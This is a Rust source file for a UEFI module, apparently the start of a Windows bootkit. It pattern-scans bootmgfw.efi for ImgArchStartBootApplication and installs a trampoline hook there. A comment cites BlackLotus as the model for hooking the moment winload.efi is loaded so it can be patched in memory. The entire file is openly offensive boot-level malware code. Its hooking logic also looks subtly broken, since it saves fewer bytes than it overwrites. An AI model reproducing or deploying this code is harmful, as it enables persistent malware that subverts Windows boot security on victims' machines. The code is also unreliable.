use core::ptr::copy_nonoverlapping;
use core::slice;
use core::slice::from_raw_parts;
use uefi::prelude::BootServices;
use uefi::proto::loaded_image::LoadedImage;
use uefi::Handle;

use alloc::vec::Vec;
extern crate alloc;

const JMP_SIZE: usize = 6;
static mut ORIGINAL_BYTES: [u8; JMP_SIZE] = [0u8; 6];

#[allow(non_camel_case_types)]
type fnImgArchStartBootApplication = fn(
    app_entry: *mut u8,
    image_base: *mut u8,
    image_size: u32,
    boot_option: u8,
    return_arguments: *mut u8,
);

#[allow(non_upper_case_globals)]
static mut ImgArchStartBootApplication: Option<fnImgArchStartBootApplication> = None;

pub fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
    let bootmgr = boot_services
        .open_protocol_exclusive::<LoadedImage>(*bootmgr_handle)
        .expect("Failed to open handle to uefi bootmgr");

    // Returns the base address and the size in bytes of the loaded image.
    let (image_base, image_size) = bootmgr.info();

    // Read the data bootmgr_data as bytes
    let bootmgr_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the ImgArchStartBootApplication signature in Windows EFI Boot Manager (bootmgfw.efi) and return an offset
    let img_arch_start_boot_application_offset = pattern_scan(bootmgr_data, "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9")
    .expect("Failed to pattern scan").expect("Failed to convert to offset from pattern scan");

    // Print the address of ImgArchStartBootApplication
    log::info!(
        "Image Base: {:#x} + Function Offset: {:#x} = {:#x}",
        image_base as usize,
        img_arch_start_boot_application_offset,
        (image_base as usize + img_arch_start_boot_application_offset)
    );

    // Trampline hook the ImgArchStartBootApplication function to setup winload.efi hook
    //
    // ImgArchStartBootApplication in bootmgfw.efi or bootmgr.efi:
    // This function is commonly hooked by bootkits to catch the moment when the Windows OS loader (winload.efi) is loaded in the memory but still hasn't been executed
    // – which is the right moment to perform more in-memory patching.
    // https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/

    let img_arch_start_boot_application_hook_ptr =
        img_arch_start_boot_application_hook as *mut () as *mut u8;

    let img_arch_start_boot_application_address =
        (image_base as usize + img_arch_start_boot_application_offset) as *mut u8;

    let img_arch_start_boot_application_ptr = trampoline_hook(
        img_arch_start_boot_application_hook_ptr,
        img_arch_start_boot_application_address,
        unsafe { Some(&mut ORIGINAL_BYTES) },
    );

    unsafe {
        ImgArchStartBootApplication =
            Some(core::mem::transmute::<_, fnImgArchStartBootApplication>(
                img_arch_start_boot_application_ptr,
            ))
    };
}

pub fn img_arch_start_boot_application_hook(
    _app_entry: *mut u8,
    _image_base: *mut u8,
    _image_size: u32,
    _boot_option: u8,
    _return_arguments: *mut u8,
) {
    unsafe {
        trampoline_unhook(
            ImgArchStartBootApplication.unwrap() as *mut u8,
            &ORIGINAL_BYTES,
        )
    };
}

#[allow(dead_code)]
fn trampoline_hook(dest: *mut u8, src: *mut u8, original: Option<&mut [u8; 6]>) -> *mut u8 {
    if let Some(original) = original {
        original.copy_from_slice(unsafe { slice::from_raw_parts(src, 6) });
    }

    unsafe {
        let jmp_size = 6;
        let hook_bytes = [0xFF, 0x25, 0x00, 0x00, 0x00, 0x00];
        copy_nonoverlapping(hook_bytes.as_ptr(), src, jmp_size);

        let dest_ptr = dest as *mut *mut u8;
        let dst_jmp_offset = src.offset(6) as *mut *mut u8;
        dst_jmp_offset.write(dest_ptr as _);

        src
    }
}

#[allow(dead_code)]
fn trampoline_unhook(src: *mut u8, original: &[u8; 6]) {
    unsafe {
        copy_nonoverlapping(original.as_ptr(), src, 6);
    }
}

/// Convert a combo pattern to bytes without wildcards
pub fn get_bytes_as_hex(pattern: &str) -> Result<Vec<Option<u8>>, ()> {
    let mut pattern_bytes = Vec::new();

    for x in pattern.split_whitespace() {
        match x {
            "?" => pattern_bytes.push(None),
            _ => pattern_bytes.push(u8::from_str_radix(x, 16).map(Some).map_err(|_| ())?),
        }
    }

    Ok(pattern_bytes)
}

/// Pattern or Signature scan a region of memory
pub fn pattern_scan(data: &[u8], pattern: &str) -> Result<Option<usize>, ()> {
    let pattern_bytes = get_bytes_as_hex(pattern)?;

    let offset = data.windows(pattern_bytes.len()).position(|window| {
        window
            .iter()
            .zip(&pattern_bytes)
            .all(|(byte, pattern_byte)| pattern_byte.map_or(true, |b| *byte == b))
    });

    Ok(offset)
}
